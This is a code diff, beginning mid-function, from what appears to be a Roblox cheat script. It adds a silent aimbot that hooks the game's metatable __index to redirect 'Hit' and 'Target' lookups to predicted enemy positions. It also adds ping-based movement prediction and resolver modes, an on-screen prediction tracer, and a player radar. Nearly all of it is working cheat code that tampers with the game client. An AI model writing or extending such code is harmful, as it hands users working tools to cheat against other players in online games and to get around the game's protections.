+        if not player or not player.Character then return nil end
+        local char = player.Character
+        -- prefer user-selected part
+        local selected = flags and flags["aimbot_part"]
+        if selected and char:FindFirstChild(selected) then
+            return char[selected]
+        end
+        for _, name in ipairs(PreferredParts) do
+            local p = char:FindFirstChild(name)
+            if p then return p end
+        end
+        return nil
+    end
+
+    local resolver_cache = { lastPos = nil, lastTick = nil, lastPart = nil }
+
+    local function get_predicted_position(part)
+        if not part then return nil end
+        local pos = part.Position
+        if flags["pred_enabled"] then
+            -- resolver velocity selection
+            local vel
+            local resolverOn = flags["resolver_enabled"]
+            local modeRes = flags["resolver_mode"]
+            if resolverOn and modeRes and modeRes ~= "Velocity" then
+                if modeRes == "Recalculate" or modeRes == "CalculateCFrame" then
+                    if resolver_cache.lastPart ~= part then
+                        resolver_cache.lastPos, resolver_cache.lastTick, resolver_cache.lastPart = part.Position, tick(), part
+                    end
+                    local now = tick()
+                    local dt = (resolver_cache.lastTick and (now - resolver_cache.lastTick)) or 0
+                    if dt > 0 and resolver_cache.lastPos then
+                        vel = (part.Position - resolver_cache.lastPos) / dt
+                    else
+                        vel = part.AssemblyLinearVelocity or part.Velocity or Vector3.zero
+                    end
+                    resolver_cache.lastPos, resolver_cache.lastTick = part.Position, now
+                elseif modeRes == "MoveDirection" then
+                    local humanoid = part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        vel = humanoid.MoveDirection * (humanoid.WalkSpeed or 16)
+                    end
+                elseif modeRes == "LookVector" then
+                    local humanoid = part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
+                    local speed = (humanoid and humanoid.WalkSpeed) or 16
+                    vel = part.CFrame.LookVector * (speed * 1.5)
+                end
+            end
+            vel = vel or part.AssemblyLinearVelocity or part.Velocity or Vector3.zero
+            local mode = flags["pred_mode"]
+            if mode == "Auto" then
+                local s = get_auto_scalar()
+                pos = pos + (vel * Vector3.new(s, s, s))
+            else
+                local vx = tonumber(flags["pred_x"]) or 0
+                local vy = tonumber(flags["pred_y"]) or 0
+                local vz = tonumber(flags["pred_z"]) or 0
+                pos = pos + (vel * Vector3.new(vx, vy, vz))
+            end
+        end
+        return pos
+    end
+
+    local mt = getrawmetatable(game)
+    local oldIndex = mt.__index
+    setreadonly(mt, false)
+
+    mt.__index = newcclosure(function(self, key)
+        -- enable only when aimbot is on
+        if not checkcaller() and key and (key == "Hit" or key == "Silent" or key == "Target") and flags and flags["aimbot_enabled"] then
+            local player = targeting_state.current
+            local part = get_target_part(player)
+            if part then
+                local predicted = get_predicted_position(part) or part.Position
+                if key == "Hit" then
+                    return CFrame.new(predicted)
+                elseif key == "Silent" or key == "Target" then
+                    return part
+                end
+            end
+        end
+        return oldIndex(self, key)
+    end)
+
+    setreadonly(mt, true)
+end
+-- aimbot runtime end
+
+-- prediction tracer runtime start
+do
+    local Drawing = Drawing
+    local UserInputService = game:GetService("UserInputService")
+    local RunService = game:GetService("RunService")
+    local Camera = workspace.CurrentCamera
+    
+    -- guard against duplicates: cleanup previous tracer if exists
+    do
+        local prev = getgenv().PredictionTracer
+        if prev and prev.cleanup then
+            pcall(prev.cleanup)
+        end
+    end
+    local PT = { }
+    getgenv().PredictionTracer = PT
+    
+    -- create tracer outline (for nicer look)
+    local tracerOutline = Drawing.new("Line")
+    tracerOutline.Visible = false
+    tracerOutline.Thickness = 6 -- base, will sync to tracer.Thickness + 2
+    tracerOutline.Transparency = 0.7
+    tracerOutline.Color = Color3.fromRGB(0, 0, 0)
+    PT.tracerOutline = tracerOutline
+    
+    -- create tracer line
+    local tracer = Drawing.new("Line")
+    tracer.Visible = false
+    tracer.Thickness = 1.5 -- slightly thinner
+    tracer.Transparency = 1
+    PT.tracer = tracer
+    
+    -- base tip radius for end circles
+    local baseTipR = 4
+    
+    -- endpoint circles (start/end) with outlines
+    local startOutline = Drawing.new("Circle")
+    startOutline.Visible = false
+    startOutline.Filled = false -- outline stroke to match tracer thickness
+    startOutline.Color = Color3.fromRGB(0, 0, 0)
+    startOutline.Transparency = 0.8
+    startOutline.Radius = 4 -- outline radius
+    PT.startOutline = startOutline
+    
+    local startCircle = Drawing.new("Circle")
+    startCircle.Visible = false
+    startCircle.Filled = true
+    startCircle.Color = Color3.fromRGB(255, 255, 255)
+    startCircle.Transparency = 1
+    startCircle.Radius = 2
+    PT.startCircle = startCircle
+    
+    local endOutline = Drawing.new("Circle")
+    endOutline.Visible = false
+    endOutline.Filled = false -- outline stroke to match tracer thickness
+    endOutline.Color = Color3.fromRGB(0, 0, 0)
+    endOutline.Transparency = 0.8
+    endOutline.Radius = 4
+    PT.endOutline = endOutline
+    
+    local endCircle = Drawing.new("Circle")
+    endCircle.Visible = false
+    endCircle.Filled = true
+    endCircle.Color = Color3.fromRGB(255, 255, 255)
+    endCircle.Transparency = 1
+    endCircle.Radius = 2
+    PT.endCircle = endCircle
+    
+    -- preferences (reuse from aimbot)
+    local PreferredParts = { "HumanoidRootPart", "Head", "UpperTorso", "Torso" }
+    -- ping -> scalar prediction table (Auto mode)
+    local predictionTable = {
+        {20, 0.08960952},{30, 0.11252476},{50, 0.13544},{65, 0.1264236},{70, 0.12533},
+        {80, 0.13934},{100, 0.141987},{110, 0.144634},{120, 0.147281},{130, 0.149928},
+        {140, 0.152575},{150, 0.155222},{160, 0.157869},{170, 0.160516},{180, 0.163163},
+        {190, 0.16581},{200, 0.168457},{210, 0.171104},{220, 0.173751},{230, 0.176398},
+        {240, 0.179045},{250, 0.181692},{260, 0.184339},{270, 0.186986},{280, 0.189633},
+        {290, 0.19228},{300, 0.194927}
+    }
+
+    local lastAuto = { t = 0, val = 0 }
+    local function get_auto_scalar()
+        local now = tick and tick() or os.clock()
+        if now - (lastAuto.t or 0) < 0.25 then
+            return lastAuto.val or 0
+        end
+        local stats = game:GetService("Stats")
+        local pingMs
+        local ok, _ = pcall(function()
+            local s = stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
+            pingMs = tonumber((s or ""):match("%d+"))
+        end)
+        if not ok or not pingMs then return lastAuto.val or 0 end
+        local bestVal, bestDiff
+        for _, pair in ipairs(predictionTable) do
+            local diff = math.abs(pingMs - pair[1])
+            if not bestDiff or diff < bestDiff then
+                bestDiff = diff
+                bestVal = pair[2]
+            end
+        end
+        lastAuto.t = now
+        lastAuto.val = bestVal or lastAuto.val or 0
+        return lastAuto.val or 0
+    end
+    
+    local function get_target_part(player)
+        if not player or not player.Character then return nil end
+        local char = player.Character
+        -- prefer user-selected part
+        local selected = flags and flags["aimbot_part"]
+        if selected and char:FindFirstChild(selected) then
+            return char[selected]
+        end
+        for _, name in ipairs(PreferredParts) do
+            local p = char:FindFirstChild(name)
+            if p then return p end
+        end
+        return nil
+    end
+    
+    local function get_predicted_position(part)
+        if not part then return nil end
+        local pos = part.Position
+        if flags["pred_enabled"] then
+            local vel = part.AssemblyLinearVelocity or part.Velocity or Vector3.zero
+            local mode = flags["pred_mode"]
+            if mode == "Auto" then
+                local s = get_auto_scalar()
+                pos = pos + (vel * Vector3.new(s, s, s))
+            else
+                local vx = tonumber(flags["pred_x"]) or 0
+                local vy = tonumber(flags["pred_y"]) or 0
+                local vz = tonumber(flags["pred_z"]) or 0
+                pos = pos + (vel * Vector3.new(vx, vy, vz))
+            end
+        end
+        return pos
+    end
+    
+    -- update tracer
+    local conn = RunService.RenderStepped:Connect(function()
+        if flags["show_prediction"] and targeting_state.current then
+            local part = get_target_part(targeting_state.current)
+            if part then
+                local predicted = get_predicted_position(part)
+                if predicted then
+                    local screen_pos, on_screen = Camera:WorldToViewportPoint(predicted)
+                    if on_screen then
+                        -- get mouse position
+                        local mouse_pos = UserInputService:GetMouseLocation()
+                        
+                        -- update tracer outline (behind main line)
+                        tracerOutline.From = mouse_pos
+                        tracerOutline.To = Vector2.new(screen_pos.X, screen_pos.Y)
+                        tracerOutline.Thickness = math.max(1, (tracer.Thickness or 2) + 2)
+                        if not tracerOutline.Visible then tracerOutline.Visible = true end
+
+                        -- update tracer
+                        tracer.From = mouse_pos
+                        tracer.To = Vector2.new(screen_pos.X, screen_pos.Y)
+                        local newColor = (flags["prediction_color"] and flags["prediction_color"].Color) or Color3.fromRGB(255, 255, 255)
+                        if tracer.Color ~= newColor then tracer.Color = newColor end
+                        if not tracer.Visible then tracer.Visible = true end
+
+                        -- update endpoint circles
+                        local tipColor = tracer.Color
+                        local endPos = Vector2.new(screen_pos.X, screen_pos.Y)
+
+                        -- inner circles first (to use their radius for outlines)
+                        startCircle.Position = mouse_pos
+                        startCircle.Radius = math.max(1, baseTipR * 0.25) -- mouse tip: 0.25x
+                        if startCircle.Color ~= tipColor then startCircle.Color = tipColor end
+                        if not startCircle.Visible then startCircle.Visible = true end
+
+                        endCircle.Position = endPos
+                        endCircle.Radius = math.max(1, baseTipR * 0.5) -- end tip: 0.5x
+                        if endCircle.Color ~= tipColor then endCircle.Color = tipColor end
+                        if not endCircle.Visible then endCircle.Visible = true end
+
+                        -- outlines sync after inner set
+                        local outlineThk = math.max(1, (tracer.Thickness or 2) + 2)
+                        startOutline.Position = mouse_pos
+                        startOutline.Thickness = outlineThk
+                        startOutline.Radius = startCircle.Radius + (outlineThk / 2)
+                        if not startOutline.Visible then startOutline.Visible = true end
+
+                        endOutline.Position = endPos
+                        endOutline.Thickness = outlineThk
+                        endOutline.Radius = endCircle.Radius + (outlineThk / 2)
+                        if not endOutline.Visible then endOutline.Visible = true end
+                    else
+                        if tracer.Visible then tracer.Visible = false end
+                        if tracerOutline.Visible then tracerOutline.Visible = false end
+                        if startCircle.Visible then startCircle.Visible = false end
+                        if endCircle.Visible then endCircle.Visible = false end
+                        if startOutline.Visible then startOutline.Visible = false end
+                        if endOutline.Visible then endOutline.Visible = false end
+                    end
+                else
+                    if tracer.Visible then tracer.Visible = false end
+                    if tracerOutline.Visible then tracerOutline.Visible = false end
+                    if startCircle.Visible then startCircle.Visible = false end
+                    if endCircle.Visible then endCircle.Visible = false end
+                    if startOutline.Visible then startOutline.Visible = false end
+                    if endOutline.Visible then endOutline.Visible = false end
+                end
+            else
+                if tracer.Visible then tracer.Visible = false end
+                if tracerOutline.Visible then tracerOutline.Visible = false end
+                if startCircle.Visible then startCircle.Visible = false end
+                if endCircle.Visible then endCircle.Visible = false end
+                if startOutline.Visible then startOutline.Visible = false end
+                if endOutline.Visible then endOutline.Visible = false end
+            end
+        else
+            if tracer.Visible then tracer.Visible = false end
+            if tracerOutline.Visible then tracerOutline.Visible = false end
+            if startCircle.Visible then startCircle.Visible = false end
+            if endCircle.Visible then endCircle.Visible = false end
+            if startOutline.Visible then startOutline.Visible = false end
+            if endOutline.Visible then endOutline.Visible = false end
+        end
+    end)
+    table.insert(library.connections, conn)
+    PT.conn = conn
+
+    -- provide cleanup for future reloads
+    PT.cleanup = function()
+        pcall(function() if PT.conn then PT.conn:Disconnect() end end)
+        local function safe_remove(obj)
+            if obj and obj.Remove then pcall(function() obj:Remove() end) end
+        end
+        safe_remove(PT.tracer)
+        safe_remove(PT.tracerOutline)
+        safe_remove(PT.startCircle)
+        safe_remove(PT.startOutline)
+        safe_remove(PT.endCircle)
+        safe_remove(PT.endOutline)
+        getgenv().PredictionTracer = nil
+    end
+end
+-- prediction tracer runtime end
+
+-- target tracer system start
+do
+    local vars = {
+        rs = game:GetService("RunService"),
+        uis = game:GetService("UserInputService"),
+        camera = workspace.CurrentCamera
+    }
+    
+    -- tracer state
+    local tracer_state = {
+        line = nil,
+        line_outline = nil,
+        enabled = false,
+        part = "HumanoidRootPart",
+        origin = "mouse",
+        connection = nil
+    }
+    
+    -- r15 body parts
+    local r15_parts = {
+        "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart",
+        "LeftUpperArm", "LeftLowerArm", "LeftHand",
+        "RightUpperArm", "RightLowerArm", "RightHand",
+        "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
+        "RightUpperLeg", "RightLowerLeg", "RightFoot"
+    }
+    
+    -- cleanup function
+    local function cleanup_tracer()
+        if tracer_state.line then
+            pcall(function() tracer_state.line:Remove() end)
+            tracer_state.line = nil
+        end
+        if tracer_state.line_outline then
+            pcall(function() tracer_state.line_outline:Remove() end)
+            tracer_state.line_outline = nil
+        end
+        if tracer_state.connection then
+            pcall(function() tracer_state.connection:Disconnect() end)
+            tracer_state.connection = nil
+        end
+    end
+
+end
 
 getgenv().load_config = function(name)
 	library:load_config(readfile(library.directory .. "/configs/" .. name .. ".cfg"))
@@ -481,15 +1664,22 @@ do
     end))
 
     table.insert(library.connections, RunService.RenderStepped:Connect(function()
-        if not radar or not flags["hud_radar"] then return end
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= lp then
-                local char = p.Character
-                local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    radar.update_dot(p, hrp.Position)
+        -- radar update
+        if radar and flags["hud_radar"] then
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= lp then
+                    local char = p.Character
+                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                    if hrp then
+                        radar.update_dot(p, hrp.Position)
+                    end
                 end
             end
+        end
+        
+        -- target highlight update (throttled)
+        if framework and framework.update_target_highlight then
+            framework:update_target_highlight()
         end
     end))
 end
